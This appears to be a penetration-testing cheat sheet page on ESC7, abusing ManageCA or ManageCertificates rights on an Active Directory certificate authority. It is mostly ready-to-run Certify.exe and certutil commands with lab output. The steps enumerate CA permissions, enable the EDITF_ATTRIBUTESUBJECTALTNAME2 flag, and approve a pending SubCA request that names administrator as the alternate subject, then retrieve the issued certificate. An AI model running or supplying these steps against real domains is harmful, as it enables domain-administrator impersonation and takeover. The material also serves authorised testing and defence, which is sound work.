title: ESC7: Vulnerable CA ACL
html:
Conditions: ManageCA or ManageCertificates permissions on the CA object itself (not a template).

Enumerate CA Permissions

Certify.exe find /vulnerable
Certify.exe find /vulnerable

    CA Name : braavos.essos.local\ESSOS-CA
    Permissions
      Access Rights : ESSOS\viserys.targaryen   Access: ManageCA
      Access Rights : ESSOS\viserys.targaryen   Access: ManageCertificates

ManageCA — Enable EDITF_ATTRIBUTESUBJECTALTNAME2

certutil -config "<ca-host>\<ca-name>" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service CertSvc
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\...\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
CertUtil: -setreg command completed successfully.
Restart-Service CertSvc

ManageCertificates — Approve Pending Requests

# Submit SubCA request (will be pending)
Certify.exe request /ca:<ca-host>\<ca-name> /template:SubCA /altname:<target-user>@<domain>

# Approve the pending request
certutil -config "<ca-host>\<ca-name>" -approve <request-id>

# Retrieve issued certificate
Certify.exe request /ca:<ca-host>\<ca-name> /retrieve <request-id>
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:SubCA /altname:administrator@essos.local

[*] CA Response : Taken Under Submission
[*] Request ID  : 14

certutil -config "braavos.essos.local\ESSOS-CA" -approve 14
# Request 14 approved.

Certify.exe request /ca:braavos.essos.local\ESSOS-CA /retrieve 14
[*] Certificate retrieved successfully
excerpt: Conditions: ManageCA or ManageCertificates permissions on the CA object itself (not a template). Enumerate CA Permissions Certify.exe find /vulnerable Certify.exe find /vulnerable CA Name : braavos.es
